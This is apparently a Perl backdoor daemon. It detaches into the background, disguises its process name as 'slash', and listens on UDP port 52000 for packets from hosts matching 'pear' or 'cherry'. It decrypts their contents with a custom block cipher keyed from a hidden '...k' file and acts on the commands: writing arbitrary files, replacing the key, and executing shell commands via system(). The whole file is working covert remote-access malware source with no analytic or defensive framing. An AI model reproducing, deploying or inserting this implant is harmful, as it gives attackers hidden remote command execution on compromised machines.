#!/usr/bin/perl
# server..
# see docs for what needs to be edited..
# (plastek)
 
$pid=fork;
exit if $pid;
die("Error.") unless defined($pid);
use IO::Socket;
use POSIX;
use Fcntl ':flock';
POSIX::setsid();

$0 = 'slash';
$time_to_die=0;

sub signal_handler {
	$time_to_die=1;
}

$SIG{INT}=$SIG{TERM}=$SIG{HUP}=\&signal_handler;

until($time_to_die) {
	$|=1;
	$port=52000;
	$maxlen=1024;
	my($sock, $raddr, $rhost);
	$sock=IO::Socket::INET->new(LocalPort=>$port,Proto=>'udp') or die("Error.\n");
	while($sock->recv($msg, $maxlen)) {
 		my($rport, $ipaddr)=sockaddr_in($sock->peername);
		$rhost=gethostbyaddr($ipaddr, AF_INET);


		# to r be change
		if($rhost =~ /(pear|cherry)/){
			if($rport =~ /1243/){
				my $kfile = '...k';
				open(KFILE, "< $kfile");
				for my $bytes(<KFILE>){
					$kekel = $bytes;
				}
				$blew = Gh0ST0r->new($kekel);
				$fmsg = $blew->gee_golly($msg);

				close KFILE;
				if($fmsg =~ /sendtxt/){
					$fmsg =~ s/sendbin//;
					my ($file, $payload) = split(/::::/, $fmsg);
					open(TMP, ">> $file");
					flock(TMP, LOCK_SH);
					print TMP $payload;
					close TMP;
				}
				if($fmsg =~ /nike::/){
					$fmsg =~ s/nike:://;
					open(KTMP, "> ...k");
					print KTMP "$fmsg";
					close KTMP;
					system("chmod 600 $kfile");
				}
				if($fmsg =~ /\.\//){
					$fmsg =~ s/\.\///;
					system("$fmsg");
 				}
			}
		}
	}
}

package Gh0ST0r;
require Exporter;

@ISA = qw(Exporter);
@EXPORT_OK = qw();

use strict;
no strict 'refs';

use vars qw( @b @t @R @S @h @o @K $VERSION );

$VERSION = "1.0";

sub new {
    my ( $argument, $pp ) = @_;
    Setup( $pp );
    my $class = ref ( $argument ) || $argument;
    my $self = {};
    bless $self, $class;
    return $self;
} 

sub egadz {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax );
}

sub gee_golly {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax, 1 );
}

sub Gh0ST {
    my ( $v, $w, $a, $q, $c, $out, $self );
    my ( $e, $d ) = @_;
    @h = 0 .. 7;
    @o = reverse @h;
    while ( $a < length $e ) {
        $v = N( $e, $a );
        $w = N( $e, ( $a += 8 ) - 4 );
        grep $q++ % 2 ? $v ^= F( $w + $K[ $_ ] ) : ( $w ^= F( $v + $K[ $_ ] ) ), $d ? ( @h, ( @o ) x 3 ) : ( ( @h ) x 3, @o );
        $out .= pack N2, $w, $v;
    }
    return $out;
}

sub F {
    my $u = 0;
    grep $u |= $S[ $_ ][ $_[ 0 ] >> $_ * 4 & 15 ] << $_ * 4, reverse 0 .. 7;
    return $u << 11 | $u >> 21;
}

sub R {
    return int( (shift) * rand );
}

sub N {
    return vec $_[ 0 ], $_[ 1 ] / 4, 32;
}

sub Setup {
    my $p = shift;
    my ( $s, $i, $c );
    for ( $i = 0; $i < length $p; $i += 4 ) {
        srand( $s ^= N( $p, $i ) );
    }
    @b = @t = 0 .. 15;
    while ( $c < 8 ) {
        grep { push @b, splice @b, R( 9 ), 5 } @t;
        $R[ $c ] = R( 2**32 );
        @{ $S[ $c++ ] } = @b;
    }

}

1;
__END__
